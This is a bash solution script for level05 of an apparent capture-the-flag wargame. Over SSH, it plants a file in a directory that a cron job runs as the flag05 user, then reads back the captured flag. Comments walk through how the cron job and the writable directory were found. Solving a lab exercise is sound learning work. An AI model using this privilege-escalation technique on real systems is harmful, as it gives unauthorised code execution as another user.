#!/usr/bin/env bash

SCRIPT='
echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag;
chmod +x /opt/openarenaserver/flag;
while :;
do
  if [ -f "/tmp/flag05" ]; then
    cat /tmp/flag05;
    break;
  fi;
  sleep 10;
done;
'

# We discover with: find / -user flag05 2> /dev/null | grep -v proc
# That the user flag05 owns the /usr/sbin/openarenaserver and /rofs/usr/sbin/openarenaserver files
# And we also see inside /var/mail/level05: */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
# A cronjob that runs the /usr/sbin/openarenaserver file every 2 minutes as flag05
# And inside cat /usr/sbin/openarenaserver:

# #!/bin/bash
# for i in /opt/openarenaserver/* ; do
# 	(ulimit -t 5; bash -x "$i")
# 	rm -f "$i"
# done

# This script executes all files inside /opt/openarenaserver
# So we simply need to create a file inside /opt/openarenaserver that will execute getflag and save the output to a file


if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
	PASS=$(sshpass -p $3 ssh -o StrictHostKeyChecking=no level05@$1 -p $2 "$SCRIPT")
	PASS=$(echo $PASS | awk '{print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag05.pwd
else
	echo "Usage: ./flag05.sh <ip address> <port> <password>"
fi
